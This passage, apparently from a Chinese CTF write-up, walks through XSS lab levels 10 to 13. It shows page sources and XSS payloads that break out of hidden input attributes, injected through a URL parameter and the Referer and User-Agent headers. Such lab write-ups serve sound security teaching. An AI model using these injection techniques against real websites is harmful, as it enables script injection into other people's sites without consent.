class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level10<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level10<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;quot;</span> sRc DaTa OnFocus <span class="hljs-symbol">&amp;lt;</span>sCriPt<span class="hljs-symbol">&amp;gt;</span> <span class="hljs-symbol">&amp;lt;</span>a hReF=javascript:alert()<span class="hljs-symbol">&amp;gt;</span> 相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">search</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_link&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_history&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level10.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:56<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>居然都被实体化了，没法子，只能看一下这关的源码了</p><p><img src="/.com//ec302b1b69ecf092937347f8deb7dfe6-20250425100824-h3518vs.png" alt="ec302b1b69ecf092937347f8deb7dfe6"></p><blockquote><p>​<code>?t_sort=&quot; onfocus=javascript:alert() type=&quot;text</code>​</p></blockquote><p><strong>本关小结</strong>：根据源码猜解传参的参数名，隐藏的input标签可以插入type=“text”显示</p><hr><h1 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level12.php?keyword=good job!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level11<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level11<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和good job!相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">search</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_link&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_history&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_ref&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;http://challenges.ctf.cssec.cc:12170/level10.php?t_sort=%22%20onfocus=javascript:alert()%20type=%22text&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level11.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:9<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><input>标签有四个值，都做了隐藏处理，不难看出，第四个名为t_ref的<input>标签是http头referer的参数（就是由啥地址转跳到这里的，http头的referer会记录有），我们先做个简单的测试来验证一下前面三个标签名，GET与POST传参都试一下看看</p><p>GET传参：</p><blockquote><p>​<code>?t_link=&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;&amp;t_history=&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;&amp;t_sort=&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</code>​</p></blockquote><p>发现并未传参成功，我们来试试POST传参，发现POST传参也不行</p><p>POST传参也不得，那应该就referer头了，用burpsuite抓包一下，添加http头</p><blockquote><p>​<code>Referer: &quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</code>​</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level12.php?keyword=good job!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level11<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level11<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">search</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_link&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_history&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_ref&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;http://challenges.ctf.cssec.cc:12170/level10.php?t_sort=%22%20onfocus=javascript:alert()%20type=%22text&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level11.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:0<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发现有value值，对比发现，把大于小于号&gt;&lt;给删掉了，但是我们还能用onfocus，构造一个http头</p><blockquote><p>​<code>Referer: &quot; onfocus=javascript:alert() type=&quot;text</code>​</p></blockquote><p>之后我们再看一下这关的源码</p><p><img src="/.com//8b27b251e9938ad0db4c740a0a1c51a5-20250425101933-zsws98m.png" alt="8b27b251e9938ad0db4c740a0a1c51a5"></p><p>跟猜想的一样，这题还有GET传参的，但是有实体化函数在双引号就闭合不了了</p><p>  <strong>本关小结</strong>：考虑一下http头传值，本关是referer，但接下来也有可能是其他头，如Cookie等</p><hr><h1 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level13.php?keyword=good job!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level12<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level12<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和good job!相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">search</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_link&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_history&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_ua&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level12.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:9<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这肯定是User-Agent头了，再用burpsuite抓包一下，将User-Agent头修改为我们的测试代码</p><blockquote><p>​<code>&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</code>​</p></blockquote><p>再查看一下源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level13.php?keyword=good job!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level12<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level12<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">search</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_link&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_history&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_ua&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">sRc</span> <span class="hljs-attr">DaTa</span> <span class="hljs-attr">OnFocus</span> <span class="hljs-attr">sCriPt</span> <span class="hljs-attr">a</span> <span class="hljs-attr">hReF</span>=<span class="hljs-string">javascript:alert()</span> &amp;#<span class="hljs-attr">106</span>;&quot; <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level12.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:0<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>还是过滤了符号和JavaScript:alert() &gt;&lt;</p><p>跟上题一样，构造UA头</p><blockquote><p>​<code>&quot; onfocus=javascript:alert() type=&quot;text</code>​</p></blockquote><p>再看一下这关的源码</p><p><img src="/.com//386739e9acb53ae73944f81e0b267cb8-20250425103919-8sqk298.png" alt="386739e9acb53ae73944f81e0b267cb8"></p><p>跟上一关就一个http头的区别</p><p>  <strong>本关小结</strong>：跟上题一样，考虑一下http头传值</p><hr><h1 id="level13（暂时无法用）"><a href="#level13（暂时无法用）" class="headerlink" title="level13（暂时无法用）"></a>level13（暂时无法用）</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level14.php&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level13<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level13<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Warning<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>:  Cannot modify header information - headers already sent by (output started at /var/www/html/level13.php:15) in <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>/var/www/html/level13.php<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span> on line <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>16<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span 